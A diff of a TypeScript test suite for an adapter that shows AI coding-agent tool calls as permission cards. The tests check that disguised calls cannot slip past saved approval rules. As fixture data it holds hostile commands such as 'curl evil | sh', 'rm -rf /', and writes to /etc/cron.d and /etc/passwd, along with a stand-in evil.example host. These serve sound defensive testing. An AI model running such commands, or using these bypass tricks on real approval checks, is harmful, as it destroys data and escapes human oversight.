@@ -7,7 +7,7 @@ import http from 'node:http';
 import os from 'node:os';
 import path from 'node:path';
 import { AcpAdapter, AcpSession, EDIT_RULE, modelChoices } from '../../src/adapters/acp/adapter.ts';
-import { ACP_AGENTS, acpAccounts, folderPlugins, isCursorBinary, opencodeEnv } from '../../src/adapters/acp/agents.ts';
+import { ACP_AGENTS, acpAccounts, antigravityInput, folderPlugins, isCursorBinary, isGoogleSigned, opencodeEnv } from '../../src/adapters/acp/agents.ts';
 import type { AcpAgent } from '../../src/adapters/acp/agents.ts';
 import { AcpMcpServer } from '../../src/adapters/acp/mcp-http.ts';
 import { commandRule } from '../../src/adapters/codex/approvals.ts';
@@ -578,7 +578,7 @@ test('MCP: tools/list and an unknown tool answer as MCP says', async () => {
 
 // ---- Each of these is something a review got past the first version
 
-function fakeRequest(r: ReturnType<typeof rig>, s: AcpSession, call: Record<string, unknown>, options = [{ optionId: 'once', kind: 'allow_once' }, { optionId: 'reject', kind: 'reject_once' }]) {
+function fakeRequest(_r: ReturnType<typeof rig>, s: AcpSession, call: Record<string, unknown>, options = [{ optionId: 'once', kind: 'allow_once' }, { optionId: 'reject', kind: 'reject_once' }]) {
   const replies: unknown[] = [];
   const proc = (s as unknown as { proc: { respond(id: unknown, v: unknown): void; onRequest: (id: number, m: string, p: unknown) => void } }).proc;
   const real = proc.respond.bind(proc);
@@ -632,7 +632,7 @@ test('a saved command rule covers its own folder only, and the card says which',
   // One that isn't there can't be bound to anything: shown as given, never always allowed.
   fakeRequest(r, s, { toolCallId: 'y', kind: 'execute', rawInput: { command: 'ls -la', workdir: '/elsewhere/project' } });
   await until(() => r.cards.length === 2);
-  assert.equal((r.cards[1].input as { workdir: string }).workdir, '/elsewhere/project');
+  assert.equal((r.cards[1].input as { arguments: { workdir: string } }).arguments.workdir, '/elsewhere/project');
   assert.equal(r.cards[1].canAlwaysAllow, false);
   fs.rmSync(project, { recursive: true, force: true });
 });
@@ -671,7 +671,8 @@ test('a saved command rule covers that folder only: another, two at once, or any
   await until(() => c.length === 1);
   assert.equal(r.cards.length, 2);
   assert.equal(r.cards[1].canAlwaysAllow, false);
-  assert.deepEqual(r.cards[1].input, { command, workdir: r.cwd, cwd: '/elsewhere' });
+  assert.deepEqual(r.cards[1].input, { tool: { kind: 'execute', title: 'not said' }, command, 'runs in': 'not known', arguments: { command, workdir: r.cwd, cwd: '/elsewhere' } });
+  assert.notEqual(r.cards[1].name, 'shell', 'not a shell card the phone could allow, showing one folder (Codex, 20 Nov 2026)');
   // Through a link: `link/..` is packages/app on the disk, though it reads as
   // the thread's folder, so the rule doesn't cover it (Codex's review, 10 Nov).
   fs.symlinkSync(path.join(other, 'deep'), path.join(home, 'link'));
@@ -682,6 +683,7 @@ test('a saved command rule covers that folder only: another, two at once, or any
     assert.notDeepEqual(replies[0], allowed, id);
     assert.equal(r.cards.length, before + 1, id);
     assert.equal(r.cards.at(-1)!.canAlwaysAllow, false, `${id}: which folder it is depends on who reads the path`);
+    assert.notEqual(r.cards.at(-1)!.name, 'shell', id);
   }
   // A rule saved for a link's folder doesn't follow the link somewhere new.
   (s as unknown as { rules: Set<string> }).rules.add(commandRule(['rm', '-rf', 'generated'], path.join(other, 'deep')));
@@ -702,7 +704,8 @@ test('a saved command rule covers that folder only: another, two at once, or any
     assert.equal(r.cards.length, before + 1, id);
     const card = r.cards.at(-1)!;
     assert.equal(card.canAlwaysAllow, false, id);
-    for (const k of Object.keys(extra)) assert.ok(k in card.input, `${id}: ${k} on the card`);
+    assert.notEqual(card.name, 'shell', id);
+    for (const k of Object.keys(extra)) assert.ok(k in (card.input as { arguments: object }).arguments, `${id}: ${k} on the card`);
   }
 });
 
@@ -972,4 +975,616 @@ test('no protocol version in initialize is refused', async () => {
   r.start();
   await r.exited();
   assert.match(String(r.exitError()), /ACP version/);
+});
+
+// ---- Antigravity (Google's antigravity-acp, as Gemini)
+
+const agy = (o: Parameters<typeof rig>[0] = {}) => rig({ agent: ACP_AGENTS.antigravity, ...o, env: { FAKE_ACP_NAME: 'Antigravity', ...o.env } });
+
+test('Antigravity: a session runs from a folder of its own, with the thread\'s as an extra one, so its skills folder never lands in the repo', async () => {
+  const r = agy({ mode: 'full' });
+  const s = r.start();
+  await turn(r, s, 'exec ls');
+  const opened = r.log().find((l) => l.newSession) as { newSession: { cwd: string; additionalDirectories?: string[] } };
+  assert.notEqual(opened.newSession.cwd, r.cwd);
+  assert.deepEqual(opened.newSession.additionalDirectories, [r.cwd]);
+  assert.equal(fs.existsSync(path.join(r.cwd, 'skills')), false, 'nothing written into the thread\'s folder');
+  assert.ok(fs.existsSync(path.join(opened.newSession.cwd, 'skills')), 'it went in its own folder');
+  assert.deepEqual(r.log().find((l) => l.ran), { ran: 'ls', in: r.cwd });
+  const prompt = r.log().find((l) => l.prompt) as { prompt: string };
+  assert.match(prompt.prompt, new RegExp(`${r.cwd.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`), 'the first message says where the work is');
+  await s.end();
+  assert.equal(fs.existsSync(opened.newSession.cwd), false, 'its own folder goes with the session');
+});
+
+test('Antigravity: resume gets a folder of its own too', async () => {
+  const r = agy({ mode: 'full', opts: { resume: true, sessionId: 'ses-old' } });
+  const s = r.start();
+  await turn(r, s, 'hello');
+  const resumed = r.log().find((l) => l.resumed) as { cwd: string; additionalDirectories?: string[] };
+  assert.notEqual(resumed.cwd, r.cwd);
+  assert.deepEqual(resumed.additionalDirectories, [r.cwd]);
+  assert.equal(fs.existsSync(path.join(r.cwd, 'skills')), false);
+});
+
+test('Antigravity: its shell command shows as the command and folder, and Always allow covers that exact command', async () => {
+  let n = 0;
+  const r = agy({ answer: () => ({ decision: n++ === 0 ? 'allowAlways' : 'deny' }) });
+  const s = r.start();
+  await turn(r, s, 'exec ls -la');
+  assert.equal(r.cards.length, 1);
+  assert.equal(r.cards[0].name, 'shell');
+  assert.equal(r.cards[0].title, 'ls -la');
+  assert.deepEqual(r.cards[0].input, { command: 'ls -la', cwd: r.cwd });
+  assert.equal(r.cards[0].canAlwaysAllow, true);
+  await turn(r, s, 'exec ls -la', 'turn-2');
+  assert.equal(r.cards.length, 1, 'the saved rule allowed it without a card');
+  assert.equal(r.log().filter((l) => l.ran).length, 2);
+});
+
+test('Antigravity: never put in its auto-approving modes, and its own "always" is never picked', async () => {
+  const r = agy({ mode: 'full' });
+  const s = r.start();
+  await turn(r, s, 'exec ls');
+  assert.equal(r.log().some((l) => (l.set as Record<string, unknown> | undefined)?.mode), false, 'left in default, where every tool asks');
+  assert.deepEqual((r.log().find((l) => l.answered) as { answered: unknown }).answered, { outcome: { outcome: 'selected', optionId: 'allow' } });
+  for (const m of ['ask', 'auto', 'plan', 'full'] as PermissionMode[]) assert.equal(ACP_AGENTS.antigravity.modeFor(m), 'default');
+});
+
+test('Antigravity: reading a file in the thread\'s folder goes ahead in Ask; outside it, a card', async () => {
+  const r = agy({ deny: true });
+  fs.writeFileSync(path.join(r.cwd, 'a.txt'), 'x');
+  const s = r.start();
+  await turn(r, s, `read ${path.join(r.cwd, 'a.txt')}`);
+  assert.equal(r.cards.length, 0);
+  assert.deepEqual(r.log().find((l) => l.read), { read: path.join(r.cwd, 'a.txt') });
+  await turn(r, s, `read ${path.join(r.root, 'agent.log')}`, 'turn-2');
+  assert.equal(r.cards.length, 1, 'outside the folder asks');
+  // Through a link out of the folder, it's where the link goes that counts.
+  fs.symlinkSync(r.root, path.join(r.cwd, 'out'));
+  await turn(r, s, `read ${path.join(r.cwd, 'out', 'agent.log')}`, 'turn-3');
+  assert.equal(r.cards.length, 2, 'a link out of the folder asks');
+});
+
+test('Antigravity: the row', () => {
+  const a = ACP_AGENTS.antigravity;
+  assert.equal(a.identifies({ agentInfo: { name: 'antigravity-acp' } }), true);
+  assert.equal(a.identifies({ agentInfo: { name: 'OpenCode' } }), false);
+  const env = a.env({ binary: '/x/agy/agy_acp_server.par' });
+  for (const k of ['GEMINI_API_KEY', 'GOOGLE_API_KEY', 'GOOGLE_GENERATIVE_AI_API_KEY', 'GOOGLE_APPLICATION_CREDENTIALS']) assert.ok(k in env && env[k] === undefined, `${k} taken out, so the Google sign-in is used, not a key`);
+  assert.equal(env.ANTIGRAVITY_HARNESS_PATH, '/x/agy/localharness_external');
+  assert.deepEqual(a.updateArgs, [], 'no updater of its own');
+});
+
+test('Antigravity: an MCP tool is named from the request\'s _meta, never from its title', () => {
+  const name = ACP_AGENTS.antigravity.mcpToolName!;
+  assert.equal(name({ kind: 'other', title: 'threadbear_end_turn', _meta: { mcp: { tool: 'end_turn', server: 'threadbear' }, is_mcp_tool_call: true } } as never), 'threadbear__end_turn');
+  assert.equal(name({ kind: 'execute', title: 'threadbear_end_turn' }), undefined, 'a command that reads like one is not one');
+  assert.equal(name({ kind: 'other', _meta: { mcp: { tool: 'end_turn', server: 'threadbear' } } } as never), undefined, 'only when it says it is an MCP call');
+  assert.equal(name({ kind: 'other', _meta: { mcp: { tool: '', server: 'threadbear' }, is_mcp_tool_call: true } } as never), undefined);
+});
+
+test('Antigravity: a read only goes ahead when it is plainly inside the folder', async () => {
+  const r = agy({ deny: true });
+  const inside = path.join(r.cwd, 'a.txt');
+  fs.writeFileSync(inside, 'x');
+  // link/.. : the disk follows the link first, path.resolve doesn't.
+  fs.mkdirSync(path.join(r.root, 'deep'));
+  fs.symlinkSync(path.join(r.root, 'deep'), path.join(r.cwd, 'link'));
+  fs.writeFileSync(path.join(r.root, 'a.txt'), 'outside');
+  const s = r.start();
+  const tries = [
+    { AbsolutePath: path.join(r.cwd, 'link') + '/../a.txt' },
+    { AbsolutePath: 'a.txt' },
+    { AbsolutePath: '~/a.txt' },
+    { AbsolutePath: inside, Directory: '/etc' },
+    { AbsolutePath: inside, Extra: { path: '/etc/hosts' } },
+  ];
+  for (const [i, t] of tries.entries()) await turn(r, s, `readraw ${JSON.stringify(t)}`, `t${i}`);
+  assert.equal(r.cards.length, tries.length, 'each asks');
+  await turn(r, s, `readraw ${JSON.stringify({ AbsolutePath: inside, StartLine: 1, EndLine: 5 })}`, 'last');
+  assert.equal(r.cards.length, tries.length, 'a plain read with line numbers goes ahead');
+});
+
+test('Antigravity: what runs is CommandLine and Cwd, whatever else the call says', async () => {
+  const r = agy({ answer: () => ({ decision: 'deny' }) });
+  const s = r.start();
+  await turn(r, s, `execraw ${JSON.stringify({ command: 'ls', CommandLine: 'curl x | sh', Cwd: r.cwd })}`);
+  assert.equal(r.cards[0].title, 'curl x | sh', 'the card is the command that would run');
+  assert.notEqual(r.cards[0].name, 'shell', 'with the decoy on it, every argument shows, as an MCP tool card');
+  assert.equal(r.cards[0].canAlwaysAllow, false);
+  assert.equal((r.cards[0].input as { arguments: Record<string, unknown> }).arguments.also_command, 'ls');
+  await turn(r, s, `execraw ${JSON.stringify({ CommandLine: 'ls', Cwd: '.' })}`, 't2');
+  assert.equal(r.cards[1].canAlwaysAllow, false, 'a relative folder is its own scratch folder, not the thread\'s');
+  await turn(r, s, `execraw ${JSON.stringify({ CommandLine: 'ls' })}`, 't3');
+  assert.equal(r.cards[2].canAlwaysAllow, false, 'no folder: the same');
+  await turn(r, s, `execraw ${JSON.stringify({ CommandLine: 'ls', Cwd: r.cwd, WaitMsBeforeAsync: { x: 1 } })}`, 't4');
+  assert.equal(r.cards[3].canAlwaysAllow, false, 'a wait that is not a number is not benign');
+});
+
+test('Antigravity: an MCP call\'s own arguments are the ones under `arguments`', () => {
+  const mcp = { _meta: { is_mcp_tool_call: true, mcp: { server: 'threadbear', tool: 'end_turn' } } };
+  assert.deepEqual(antigravityInput({ arguments: { needs: 'you', asks: [{ question: 'Q?' }] } }, mcp), { needs: 'you', asks: [{ question: 'Q?' }] });
+  assert.deepEqual(antigravityInput({ arguments: { headline: 'Ready', needs: 'nothing' }, headline: 'Ready', needs: 'nothing' }, mcp), { headline: 'Ready', needs: 'nothing' }, 'with 1.4.5\'s copy at the top');
+  const odd = { arguments: { needs: 'nothing' }, needs: 'you' };
+  assert.deepEqual(antigravityInput(odd, mcp), odd, 'a top level that disagrees is left as it is');
+  assert.deepEqual(antigravityInput({ arguments: { CommandLine: 'x' } }), { arguments: { CommandLine: 'x' } }, 'only an MCP call is unwrapped');
+  assert.deepEqual(antigravityInput({ CommandLine: 'ls', Cwd: '/w', WaitMsBeforeAsync: 5 }), { command: 'ls', cwd: '/w', WaitMsBeforeAsync: 5 });
+  assert.deepEqual(antigravityInput({ CommandLine: 'ls', cwd: '/w', workdir: '/v' }), { command: 'ls', also_cwd: '/w', also_workdir: '/v' }, 'only Cwd says where it runs');
+  assert.deepEqual(antigravityInput({ CommandLine: 'ls', command: 'a', also_command: 'b' }), { command: 'ls', also_command: 'b', also_also_command: 'a' }, 'nothing is lost to a name already taken');
+  const proto = antigravityInput(JSON.parse('{"AbsolutePath":"/w/a","constructor":{"path":"/etc/passwd"},"toString":1}'));
+  assert.deepEqual(Object.keys(proto).sort(), ['AbsolutePath', 'constructor', 'toString'], 'keys named like Object.prototype\'s are kept');
+});
+
+test('Antigravity: a binary counts only when it and the harness beside where it really is are there', () => {
+  const root = tmp();
+  made.push(root);
+  const dir = path.join(root, 'agy');
+  fs.mkdirSync(dir);
+  const par = path.join(dir, 'agy_acp_server.par');
+  fs.writeFileSync(par, '#!/bin/sh\n', { mode: 0o755 });
+  assert.equal(isGoogleSigned(path.join(dir, 'missing'), 'linux'), false, 'not there is never signed');
+  assert.equal(isGoogleSigned(par, 'linux'), true);
+  if (process.platform === 'darwin') assert.equal(ACP_AGENTS.antigravity.findBinary({ explicit: par, home: root, pathEnv: '' }), undefined, 'not signed by Google');
+  const link = path.join(root, 'bin-par');
+  fs.symlinkSync(par, link);
+  assert.equal(ACP_AGENTS.antigravity.env({ binary: link }).ANTIGRAVITY_HARNESS_PATH, path.join(dir, 'localharness_external'));
+});
+
+test('Antigravity: a folder key that is not its Cwd never says where a command runs', async () => {
+  let n = 0;
+  const r = agy({ answer: () => ({ decision: n++ === 0 ? 'allowAlways' : 'deny' }) });
+  const s = r.start();
+  await turn(r, s, `execraw ${JSON.stringify({ CommandLine: 'ls', Cwd: r.cwd })}`);
+  assert.equal(r.cards.length, 1);
+  await turn(r, s, `execraw ${JSON.stringify({ CommandLine: 'ls', cwd: r.cwd })}`, 't2');
+  assert.equal(r.cards.length, 2, 'the saved rule does not cover it: with no Cwd it runs from its own folder');
+  assert.notEqual(r.cards[1].name, 'shell');
+  assert.equal((r.cards[1].input as Record<string, unknown>).cwd, undefined, 'no folder shown as if it were where it runs');
+});
+
+test('Antigravity: no read goes ahead for an MCP tool, or with a line number that is not a number', async () => {
+  const r = agy({ deny: true });
+  const inside = path.join(r.cwd, 'a.txt');
+  fs.writeFileSync(inside, 'x');
+  const s = r.start();
+  await turn(r, s, `readraw ${JSON.stringify({ AbsolutePath: inside, StartLine: '/etc/passwd' })}`);
+  await turn(r, s, `readraw ${JSON.stringify({ StartLine: 1 })}`, 't2');
+  assert.equal(r.cards.length, 2);
+});
+
+const frame = (s: AcpSession, update: Record<string, unknown>) =>
+  (s as unknown as { proc: { onNotification: (m: string, p: unknown) => void } }).proc.onNotification('session/update', { update: { sessionUpdate: 'tool_call', ...update } });
+
+test('Antigravity: another MCP server\'s tool is never taken for a local command or edit, and no saved rule covers it', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  const rules = (s as unknown as { rules: Set<string> }).rules;
+  rules.add(commandRule(['rm', '-rf', 'generated'], home));
+  rules.add(EDIT_RULE);
+  const meta = { is_mcp_tool_call: true, mcp: { server: 'production', tool: 'exec' } };
+  const a = fakeRequest(r, s, { toolCallId: 'm1', kind: 'execute', _meta: meta, rawInput: { arguments: { command: 'rm -rf generated', cwd: home } } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1, 'the saved command rule does not cover it');
+  assert.equal(r.cards[0].name, 'mcp__acp__mcp');
+  // An earlier frame said it's MCP; the request itself doesn't.
+  frame(s, { toolCallId: 'm2', kind: 'edit', _meta: meta, rawInput: { path: path.join(home, 'n.txt'), content: 'x' } });
+  const b = fakeRequest(r, s, { toolCallId: 'm2', kind: 'edit', rawInput: { path: path.join(home, 'n.txt'), content: 'x' } });
+  await until(() => b.length === 1);
+  assert.equal(r.cards.length, 2, 'the saved edit rule does not cover it either');
+  assert.equal(r.cards[1].name, 'mcp__acp__mcp');
+});
+
+test('Antigravity: a read an earlier frame said more about, or an empty path, gets a card', async () => {
+  const r = agy({ deny: true });
+  const inside = path.join(fs.realpathSync(r.cwd), 'a.txt');
+  fs.writeFileSync(inside, 'x');
+  const s = r.start();
+  await ready(r, s);
+  frame(s, { toolCallId: 'r1', kind: 'read', rawInput: { AbsolutePath: inside, Directory: '/etc' } });
+  const a = fakeRequest(r, s, { toolCallId: 'r1', kind: 'read', rawInput: { AbsolutePath: inside } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1);
+  const b = fakeRequest(r, s, { toolCallId: 'r2', kind: 'read', locations: [{ path: inside }], rawInput: { AbsolutePath: inside, DirectoryPath: '' } });
+  await until(() => b.length === 1);
+  assert.equal(r.cards.length, 2);
+  const c = fakeRequest(r, s, { toolCallId: 'r3', kind: 'read', rawInput: { AbsolutePath: inside } });
+  await until(() => c.length === 1);
+  assert.equal(r.cards.length, 2, 'a plain one still goes ahead');
+});
+
+test('a command card that is not a plain shell one always says where it runs, so only the Mac can allow it', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  for (const [id, rawInput] of [['n1', { CommandLine: 'rm -rf x' }], ['n2', { CommandLine: 'ls', Cwd: null }], ['n3', { CommandLine: 'ls', Cwd: r.cwd, variant: 1 }]] as const) {
+    const before = r.cards.length;
+    const replies = fakeRequest(r, s, { toolCallId: id, kind: 'execute', rawInput });
+    await until(() => replies.length === 1);
+    const card = r.cards[before];
+    assert.notEqual(card.name, 'shell', id);
+    assert.equal(remoteCardShowsAll(card.name, card.input, r.cwd, card.title), false, `${id}: not from the phone`);
+  }
+});
+
+test('a call with an argument named __proto__ is refused, as a card would lose it', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const a = fakeRequest(r, s, { toolCallId: 'p1', kind: 'other', rawInput: JSON.parse('{"__proto__":"/outside/file"}') });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 0);
+  assert.deepEqual(a[0], { outcome: { outcome: 'selected', optionId: 'reject' } });
+});
+
+test('Antigravity: an earlier permission request for the same call counts, and so does an earlier kind', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  (s as unknown as { rules: Set<string> }).rules.add(commandRule(['rm', '-rf', 'generated'], home));
+  const meta = { is_mcp_tool_call: true, mcp: { server: 'production', tool: 'exec' } };
+  const a = fakeRequest(r, s, { toolCallId: 'x1', kind: 'execute', _meta: meta, rawInput: { arguments: { command: 'rm -rf generated', cwd: home } } });
+  await until(() => a.length === 1);
+  const b = fakeRequest(r, s, { toolCallId: 'x1', kind: 'execute', rawInput: { CommandLine: 'rm -rf generated', Cwd: home } });
+  await until(() => b.length === 1);
+  assert.equal(r.cards.length, 2, 'the second, without the MCP mark, is still that MCP call');
+  const inside = path.join(home, 'a.txt');
+  fs.writeFileSync(inside, 'x');
+  frame(s, { toolCallId: 'k1', kind: 'execute', rawInput: {} });
+  const c = fakeRequest(r, s, { toolCallId: 'k1', kind: 'read', rawInput: { AbsolutePath: inside } });
+  await until(() => c.length === 1);
+  assert.equal(r.cards.length, 3, 'a call that was something else earlier is not a read');
+});
+
+test('Antigravity: another server\'s MCP card names the tool and shows its arguments as they came; the phone never allows it', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const meta = { is_mcp_tool_call: true, mcp: { server: 'issues', tool: 'create' } };
+  const a = fakeRequest(r, s, { toolCallId: 'i1', kind: 'other', _meta: meta, rawInput: { arguments: { command: 'create', dir: 'prod', description: 'secret' } } });
+  await until(() => a.length === 1);
+  const card = r.cards[0];
+  assert.deepEqual(card.input, { tool: { kind: 'other', title: 'not said', 'MCP tool': 'issues__create' }, arguments: { command: 'create', dir: 'prod', description: 'secret' } }, 'not renamed, nothing dropped');
+  assert.equal(remoteCardShowsAll(card.name, card.input, r.cwd, card.title), false);
+  const b = fakeRequest(r, s, { toolCallId: 'e1', kind: 'execute', rawInput: { cmd: 'rm -rf x', Cwd: null } });
+  await until(() => b.length === 1);
+  assert.equal(remoteCardShowsAll(r.cards[1].name, r.cards[1].input, r.cwd, r.cards[1].title), false, 'an execute in a shape nobody checked is the Mac\'s too');
+});
+
+test('a card shows arguments that are not a list, and files named only in locations; the phone allows neither', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const a = fakeRequest(r, s, { toolCallId: 'o1', kind: 'other', title: 'Run helper', rawInput: ['rm', '-rf', '/'] });
+  await until(() => a.length === 1);
+  assert.deepEqual((r.cards[0].input as { arguments: unknown }).arguments, { 'arguments as sent': ['rm', '-rf', '/'] });
+  const b = fakeRequest(r, s, { toolCallId: 'o2', kind: 'read', title: 'Read file', locations: [{ path: '/etc/hosts' }], rawInput: { AbsolutePath: path.join(r.cwd, 'README.md') } });
+  await until(() => b.length === 1);
+  assert.ok(((r.cards[1].input as Record<string, unknown>)['files it names'] as string[]).includes('/etc/hosts'));
+  for (const c of r.cards) assert.equal(remoteCardShowsAll(c.name, c.input, r.cwd, c.title), false, c.title);
+});
+
+test('a saved rule does not cover a call whose earlier frame said something else', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  const rules = (s as unknown as { rules: Set<string> }).rules;
+  rules.add(commandRule(['ls'], home));
+  rules.add(EDIT_RULE);
+  frame(s, { toolCallId: 'c1', kind: 'execute', rawInput: { CommandLine: 'rm -rf /', Cwd: '/' } });
+  const a = fakeRequest(r, s, { toolCallId: 'c1', kind: 'execute', rawInput: { CommandLine: 'ls', Cwd: home } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1);
+  assert.notEqual(r.cards[0].name, 'shell');
+  frame(s, { toolCallId: 'c2', kind: 'execute', rawInput: { CommandLine: 'curl x | sh', Cwd: '/' } });
+  const b = fakeRequest(r, s, { toolCallId: 'c2', kind: 'edit', rawInput: { path: path.join(home, 'notes.txt'), content: 'x' } });
+  await until(() => b.length === 1);
+  assert.equal(r.cards.length, 2, 'the saved edit rule does not cover it');
+  // The same call, said the same way each time, still is.
+  frame(s, { toolCallId: 'c3', kind: 'execute', rawInput: { CommandLine: 'ls', Cwd: home } });
+  const c = fakeRequest(r, s, { toolCallId: 'c3', kind: 'execute', rawInput: { CommandLine: 'ls', Cwd: home, WaitMsBeforeAsync: 5000 } });
+  await until(() => c.length === 1);
+  assert.equal(r.cards.length, 2, 'covered');
+});
+
+test('Antigravity: an edit with a relative path is never covered by the saved edit rule', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  (s as unknown as { rules: Set<string> }).rules.add(EDIT_RULE);
+  const a = fakeRequest(r, s, { toolCallId: 'e1', kind: 'edit', rawInput: { path: 'skills/x.md', content: 'x' } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1);
+  assert.equal(r.cards[0].canAlwaysAllow, false);
+});
+
+test("OpenCode's edit, named one way while it runs and another when it asks, is still covered by the saved edit rule", async () => {
+  const r = rig({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const file = path.join(fs.realpathSync(r.cwd), 'a.txt');
+  (s as unknown as { rules: Set<string> }).rules.add(EDIT_RULE);
+  frame(s, { toolCallId: 'oc1', kind: 'edit', locations: [{ path: file }], rawInput: { filePath: file, content: 'hi' } });
+  const a = fakeRequest(r, s, { toolCallId: 'oc1', kind: 'edit', locations: [{ path: file }], rawInput: { filepath: file, diff: 'x' }, content: [{ type: 'diff', path: file, oldText: '', newText: 'hi' }] });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 0);
+});
+
+test('the saved edit rule never covers a file outside the thread\'s folder, by path or through a link', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  (s as unknown as { rules: Set<string> }).rules.add(EDIT_RULE);
+  fs.writeFileSync(path.join(r.root, 'rc'), '');
+  fs.symlinkSync(path.join(r.root, 'rc'), path.join(home, 'notes.txt'));
+  for (const [id, f] of [['w1', path.join(r.root, 'rc')], ['w2', path.join(home, 'notes.txt')], ['w3', path.join(home, 'new', 'deep', 'file.txt')]] as const) {
+    const before = r.cards.length;
+    const replies = fakeRequest(r, s, { toolCallId: id, kind: 'edit', rawInput: { path: f, content: 'x' } });
+    await until(() => replies.length === 1);
+    if (id === 'w3') assert.equal(r.cards.length, before, 'a new file inside goes ahead');
+    else {
+      assert.equal(r.cards.length, before + 1, id);
+      assert.equal(r.cards.at(-1)!.canAlwaysAllow, false, id);
+      assert.match(r.cards.at(-1)!.title, /outside this thread's folder/);
+    }
+  }
+});
+
+test('earlier frames that said something else go on the card, and a file named as part of a longer one still shows', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  frame(s, { toolCallId: 'z1', kind: 'execute', rawInput: { CommandLine: 'rm -rf /', Cwd: '/' } });
+  const a = fakeRequest(r, s, { toolCallId: 'z1', kind: 'other', title: 'Read README', rawInput: { path: path.join(r.cwd, 'README.md') } });
+  await until(() => a.length === 1);
+  assert.ok('said earlier' in (r.cards[0].input as Record<string, unknown>));
+  assert.equal(remoteCardShowsAll(r.cards[0].name, r.cards[0].input, r.cwd, r.cards[0].title), false);
+  const b = fakeRequest(r, s, { toolCallId: 'z2', kind: 'other', title: 'Inspect', locations: [{ path: path.dirname(r.cwd) }], rawInput: { path: path.join(r.cwd, 'README.md') } });
+  await until(() => b.length === 1);
+  assert.ok(((r.cards[1].input as Record<string, unknown>)['files it names'] as string[]).includes(path.dirname(r.cwd)));
+});
+
+test("a call's MCP mark is remembered after its turn", async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const inside = path.join(fs.realpathSync(r.cwd), 'a.txt');
+  fs.writeFileSync(inside, 'x');
+  frame(s, { toolCallId: 'bg1', kind: 'read', _meta: { is_mcp_tool_call: true, mcp: { server: 'prod', tool: 'x' } }, rawInput: { AbsolutePath: inside } });
+  await turn(r, s, 'hello', 'next');
+  const a = fakeRequest(r, s, { toolCallId: 'bg1', kind: 'read', rawInput: { AbsolutePath: inside } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1);
+});
+
+test('the saved edit rule never covers `link/..`, a link to a file not there yet, or `~`', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  (s as unknown as { rules: Set<string> }).rules.add(EDIT_RULE);
+  fs.mkdirSync(path.join(r.root, 'deep'));
+  fs.symlinkSync(path.join(r.root, 'deep'), path.join(home, 'sub'));
+  fs.symlinkSync(path.join(r.root, 'not-yet.txt'), path.join(home, 'dangling.txt'));
+  const tries = [path.join(home, 'sub') + '/../notes.txt', path.join(home, 'dangling.txt'), '~/notes.txt', path.join(home, 'dangling.txt', 'x')];
+  for (const [i, f] of tries.entries()) {
+    const replies = fakeRequest(r, s, { toolCallId: `d${i}`, kind: 'edit', rawInput: { path: f, content: 'x' } });
+    await until(() => replies.length === 1);
+    assert.equal(r.cards.length, i + 1, f);
+    assert.equal(r.cards[i].canAlwaysAllow, false, f);
+  }
+});
+
+test('an edit whose earlier frame was not a plain edit, or any tool whose earlier frame said other things, is shown in full', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  (s as unknown as { rules: Set<string> }).rules.add(EDIT_RULE);
+  frame(s, { toolCallId: 'e1', kind: 'edit', rawInput: { path: path.join(home, 'a.txt'), command: 'curl evil | sh' } });
+  const a = fakeRequest(r, s, { toolCallId: 'e1', kind: 'edit', rawInput: { path: path.join(home, 'a.txt'), content: 'hi' } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1, 'not covered');
+  frame(s, { toolCallId: 'o1', kind: 'other', rawInput: { command: 'rm -rf /', url: 'https://evil.example' } });
+  const b = fakeRequest(r, s, { toolCallId: 'o1', kind: 'other', title: 'Read README', rawInput: { path: path.join(home, 'README.md') } });
+  await until(() => b.length === 1);
+  assert.ok('said earlier' in (r.cards[1].input as Record<string, unknown>));
+  assert.equal(remoteCardShowsAll(r.cards[1].name, r.cards[1].input, r.cwd, r.cards[1].title), false);
+  const c = fakeRequest(r, s, { toolCallId: 'e2', kind: 'edit', rawInput: { path: path.join(home, 'n.txt'), out: '/etc/cron.d/x', run: 'curl evil | sh' } });
+  await until(() => c.length === 1);
+  assert.deepEqual((r.cards[2].input as Record<string, unknown>).arguments, { path: path.join(home, 'n.txt'), out: '/etc/cron.d/x', run: 'curl evil | sh' }, 'an edit of an unchecked shape shows its arguments');
+});
+
+test("an outside MCP tool's card names files from its earlier frames", async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const meta = { is_mcp_tool_call: true, mcp: { server: 'filesystem', tool: 'write_file' } };
+  frame(s, { toolCallId: 'm1', kind: 'other', _meta: meta, rawInput: { arguments: { path: '/outside/notes.txt', content: 'hello' } } });
+  const a = fakeRequest(r, s, { toolCallId: 'm1', kind: 'other', _meta: meta, rawInput: { arguments: { content: 'hello' } } });
+  await until(() => a.length === 1);
+  const input = r.cards[0].input as Record<string, unknown>;
